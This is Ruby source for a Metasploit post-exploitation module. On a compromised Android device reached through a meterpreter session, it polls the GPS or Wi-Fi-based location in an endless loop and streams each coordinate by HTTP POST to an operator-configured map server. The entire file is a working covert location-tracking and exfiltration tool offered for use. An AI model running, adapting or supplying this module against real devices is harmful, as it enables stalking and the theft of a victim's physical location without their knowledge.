require 'json'
require 'net/http'
require 'securerandom'
require 'uri'

class MetasploitModule < Msf::Post
  include Msf::Post::Android::System

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'         => 'Android GPS Streamer to Map Server',
        'Description'  => 'Pulls coordinates via geolocate (with wlan_geolocate fallback) and streams via HTTP POST.',
        'License'      => 'GPL-3.0-or-later',
        'Author'       => ['sighook'],
        'Platform'     => ['android'],
        'SessionTypes' => ['meterpreter']
      )
    )

    register_options([
      OptInt.new('INTERVAL', [true, 'Seconds between GPS polls', 5]),
      OptString.new('ENDPOINT', [true, 'Target server endpoint URL', 'http://127.0.0.1:8765/api/position']),
      OptString.new('API_KEY', [false, 'API key for wlan_geolocate fallback (if required)', '']),
      OptString.new('MAP_USER', [false, 'HTTP Basic username for the map server', '']),
      OptString.new('MAP_PASSWORD', [false, 'HTTP Basic password for the map server', '']),
      OptString.new('TRACK_ID', [false, 'Recording-run ID (generated for each job if omitted)', ''])
    ])
  end

  def run
    interval = datastore['INTERVAL']
    endpoint = datastore['ENDPOINT']
    api_key  = datastore['API_KEY']
    map_user = datastore['MAP_USER'].to_s
    map_password = datastore['MAP_PASSWORD'].to_s
    track_id = datastore['TRACK_ID'].to_s
    track_id = SecureRandom.uuid if track_id.empty?
    uri = URI.parse(endpoint)
    unless uri.is_a?(URI::HTTP) && uri.host && !uri.userinfo
      print_error('ENDPOINT must be an http:// or https:// URL without embedded credentials')
      return
    end
    if map_user.empty? != map_password.empty?
      print_error('MAP_USER and MAP_PASSWORD must either both be set or both be empty')
      return
    end

    unless /\A[A-Za-z0-9][A-Za-z0-9._-]{0,63}\z/.match?(track_id)
      print_error('TRACK_ID must be 1-64 ASCII letters, digits, dots, underscores or hyphens')
      return
    end

    print_status("Starting GPS stream to #{endpoint} (Interval: #{interval}s)...")
    print_status("Recording run: #{track_id}")
    print_status("Use 'jobs -k <JobID>' to stop.")

    loop do
      begin
        locations = nil

        if client.respond_to?(:android)
          # 1. Try standard GPS/Location provider geolocate first
          if client.android.respond_to?(:geolocate)
            locations = client.android.geolocate rescue nil
          end

          # 2. Fallback to wlan_geolocate if primary geolocation returned nothing
          if (locations.nil? || locations.empty?) && client.android.respond_to?(:wlan_geolocate)
            print_status("[GPS] Standard geolocate unavailable/empty, falling back to wlan_geolocate...")
            if api_key && !api_key.empty?
              locations = client.android.wlan_geolocate(api_key) rescue nil
            else
              # If wlan_geolocate requires an argument defined in the extension source
              print_error("[GPS] wlan_geolocate requires an API_KEY option to be set.")
            end
          end
        end

        if locations.is_a?(Array) && !locations.empty?
          loc = locations.first
          lat = loc['lat'] || loc[:lat]
          lon = loc['long'] || loc[:long] || loc['lon'] || loc[:lon]

          if lat && lon && lat.to_f != 0.0 && lon.to_f != 0.0
            response = submit_position(uri, lat.to_f, lon.to_f, map_user, map_password, track_id)
            if response.is_a?(Net::HTTPSuccess)
              print_good("[GPS Sent] Lat: #{lat}, Lon: #{lon} | Status: #{response.code}")
            else
              print_error("[GPS] Map server rejected the observation: HTTP #{response.code}")
            end
          else
            print_error("[GPS] Received empty or zero coordinate values.")
          end
        else
          print_error("[GPS] Geolocate returned no location data.")
        end

      rescue ::StandardError => e
        print_error("[GPS Stream Error]: #{e.message}")
      end

      sleep(interval)
    end
  end

  def submit_position(uri, lat, lon, username, password, track_id = nil)
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    http.open_timeout = 5
    http.read_timeout = 5

    request = Net::HTTP::Post.new(uri.request_uri, 'Content-Type' => 'application/json')
    request.basic_auth(username, password) unless username.empty?
    observation = { lat: lat, lon: lon }
    observation[:track_id] = track_id if track_id
    request.body = observation.to_json
    http.request(request)
  end
end
